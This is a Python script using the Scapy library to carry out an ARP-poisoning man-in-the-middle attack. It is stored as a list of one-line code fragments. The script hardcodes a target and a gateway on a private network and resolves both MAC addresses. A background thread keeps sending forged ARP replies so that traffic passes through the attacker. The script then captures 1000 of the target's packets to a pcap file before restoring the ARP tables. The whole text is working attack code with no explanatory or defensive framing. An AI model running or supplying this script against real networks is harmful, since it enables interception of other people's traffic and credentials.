["```\n#!/usr/bin/python3 \n```", "```\nfrom scapy.all import * \n```", "```\nimport os \n```", "```\nimport sys \n```", "```\nimport threading \n```", "```\nimport signal \n```", "```\ninterface = \"eth0\" \n```", "```\ntarget = \"192.168.108.173\" \n```", "```\ngateway = \"192.168.108.1\" \n```", "```\npackets = 1000 \n```", "```\nconf.iface = interface \n```", "```\nconf.verb = 0\n```", "```\ndef restore(gateway, gwmac_addr, target, targetmac_addr):\n```", "```\n   print(\"\\nRestoring normal ARP mappings.\")\n```", "```\n   send(ARP(op = 2, psrc = gateway, pdst = target, hwdst = \"ff:ff:ff:ff:ff:ff\", hwsrc = gwmac_addr), count = 5)\n```", "```\n   send(ARP(op = 2, psrc = target, pdst = gateway, hwdst = \"ff:ff:ff:ff:ff:ff\", hwsrc = targetmac_addr), count = 5)\n```", "```\n   sys.exit(0)\n```", "```\ndef macgrab(ip_addr):\n```", "```\n   responses, unanswered = srp(Ether(dst = \"ff:ff:ff:ff:ff:ff\")/ARP(pdst = ip_addr), timeout = 2, retry = 10)\n```", "```\n   for s,r in responses:\n```", "```\n     return r[Ether].src\n```", "```\n     return None\n```", "```\ndef poison_target(gateway, gwmac_addr, target, targetmac_addr):\n```", "```\n   poison_target = ARP()\n```", "```\n   poison_target.op = 2\n```", "```\n   poison_target.psrc = gateway\n```", "```\n   poison_target.pdst = target\n```", "```\n   poison_target.hwdst = targetmac_addr\n```", "```\n   poison_gateway = ARP()\n```", "```\n   poison_gateway.op = 2\n```", "```\n   poison_gateway.psrc = target\n```", "```\n   poison_gateway.pdst = gateway\n```", "```\n   poison_gateway.hwdst = gwmac_addr\n```", "```\n   print(\"\\nMitM ARP attack started.\")\n```", "```\n   while True:\n```", "```\n     try:\n```", "```\n       send(poison_target)\n```", "```\n       send(poison_gateway)\n```", "```\n       time.sleep(2)\n```", "```\n     except KeyboardInterrupt:\n```", "```\n       restore(gateway, gwmac_addr, target, targetmac_addr)\n```", "```\n   return\n```", "```\ngwmac_addr = macgrab(gateway) \n```", "```\ntargetmac_addr = macgrab(target) \n```", "```\nif gwmac_addr is None: \n```", "```\n   print(\"\\nUnable to retrieve gateway MAC address. Are you connected?\") \n```", "```\n   sys.exit(0) \n```", "```\nelse: \n```", "```\n   print(\"\\nGateway IP address: %s\\nGateway MAC address: %s\\n\" % (gateway, gwmac_addr)) \n```", "```\nif targetmac_addr is None: \n```", "```\n   print(\"\\nUnable to retrieve target MAC address. Are you connected?\") \n```", "```\n   sys.exit(0) \n```", "```\nelse: \n```", "```\n   print(\"\\nTarget IP address: %s\\nTarget MAC address: %s\\n\" % (target, targetmac_addr)) \n```", "```\nmitm_thread = threading.Thread(target = poison_target, args = (gateway, gwmac_addr, target, targetmac_addr)) \n```", "```\nmitm_thread.start() \n```", "```\ntry: \n```", "```\n   print(\"\\nMitM sniffing started. Total packets to be sniffed: %d\" % packets) \n```", "```\n   bpf = \"ip host %s\" % target \n```", "```\n   cap_packets = sniff(count=packets, filter=bpf, iface=interface) \n```", "```\n   wrpcap('arpMITMresults.pcap', cap_packets) \n```", "```\n   restore(gateway, gwmac_addr, target, targetmac_addr) \n```", "```\nexcept KeyboardInterrupt: \n```", "```\n   restore(gateway, gwmac_addr, target, targetmac_addr) \n```", "```\n   sys.exit(0)\n```"]